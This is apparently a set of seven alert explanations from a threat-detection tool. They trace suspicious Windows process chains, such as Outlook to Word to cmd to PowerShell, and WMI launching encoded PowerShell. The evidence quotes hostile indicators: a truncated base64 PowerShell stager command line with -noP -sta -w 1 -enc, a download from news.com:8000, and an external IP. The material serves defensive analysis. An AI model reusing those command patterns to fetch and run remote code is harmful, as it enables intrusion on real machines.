explanation:
Attack: A new process, rdpclip.exe, was executed with sysadmin privileges following suspicious network connections and a remote logon.
Why this event: The execution of rdpclip.exe as sysadmin is anomalous as it is a new process for this machine and is associated with a remote logon.
Chain: svchost.exe -> rdpclip.exe (new process)
Evidence: svchost.exe connected to 10.20.5.191:59619, 10.50.2.101:59619, 10.20.5.191:60787, 10.50.2.101:60787, and accepted a connection from 10.103.123.250:54756. A network logon by sysadmin (domain SYSTEMIA.COM) from 10.103.123.250 occurred at 13:47:20.

Attack: A new process gpscript.exe was executed with sysadmin privileges, indicating potential malicious activity.
Why this event: The execution of a new process with sysadmin privileges is suspicious, especially given the context of recent suspicious activity.
Chain: svchost.exe -> gpscript.exe /RefreshSystemParam
Evidence: At 13:48:21, gpscript.exe was launched by svchost.exe with the command line /RefreshSystemParam. This follows several suspicious activities, including svchost.exe launching cmd.exe to run "C:\ncr\murder_onedrive.bat" and "C:\ncr\enable_test_signing.bat". A remote logon by sysadmin (domain SYSTEMIA.COM) occurred at 13:47:20.

Attack: A malicious script was downloaded and executed via a Word document.
Why this event: The execution of a downloaded, encoded PowerShell script from an external source is indicative of malware execution.
Chain: outlook.exe -> winword.exe -> cmd.exe -> powershell.exe
Evidence: At 10:39:40, cmd.exe was spawned by winword.exe, which was started by outlook.exe. cmd.exe executed powershell.exe with a command line containing a base64 encoded string downloaded from http://news.com:8000/default.ps1.

Attack: Suspicious encoded PowerShell execution initiated by a command downloaded from an external source.
Why this event: The process launched with a heavily obfuscated, encoded command, which is characteristic of malware or post-exploitation activity.
Chain: cmd.exe -> powershell.exe (rsantilli) -> powershell.exe (rsantilli) -> powershell.exe (rsantilli)
Evidence: PowerShell started with -enc flag and executed a command containing a Base64 encoded string, connecting to 132.197.158.98:8000. Subsequent activity included running Get-WmiObject and Compare-Object commands.

Attack: Remote PowerShell execution initiated via a downloaded script from an external IP.
Why this event: The use of PowerShell to download and execute remote code is indicative of malicious activity, not standard administration.
Chain: cmd.exe -> powershell.exe (started as rsantilli) -> powershell.exe (executed subsequent commands)
Evidence: powershell.exe started at 10:39:40 via cmd.exe, connecting to 132.197.158.98:8000 to download a string from http://news.com..., followed by execution of commands like ForEach-Object and New-Object.

Attack: A suspicious, encoded PowerShell command was executed by wmiprvse.exe.
Why this event: The execution of a base64 encoded command via wmiprvse.exe is highly suspicious, as it deviates from normal administrative activity.
Chain: wmiprvse.exe -> powershell.exe (executed with -noP, -sta, -w 1, -enc).
Evidence: Process started at 2000-03-14 14:44:54 with command line C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgBUAEEAQgBMA… The decoded command attempts to retrieve cached Group Policy settings.

Attack: Suspicious encoded PowerShell execution initiated by wmiprvse.exe leading to a new conhost.exe process.
Why this event: The execution of a base64 encoded command within PowerShell, launched by wmiprvse.exe, is highly indicative of malicious activity.
Chain: wmiprvse.exe -> powershell.exe (started 14:44:54 with encoded command) -> conhost.exe (started 14:44:55).
Evidence: At 14:44:54, wmiprvse.exe started powershell.exe with the command: C:\Windows\System32\WindowsPowershell\v1.0\powershell -noP -sta -w 1 -enc SQBGACgAJABQAFMAVgBlAHIAcwBJAE8ATgB… This activity is new for this machine.
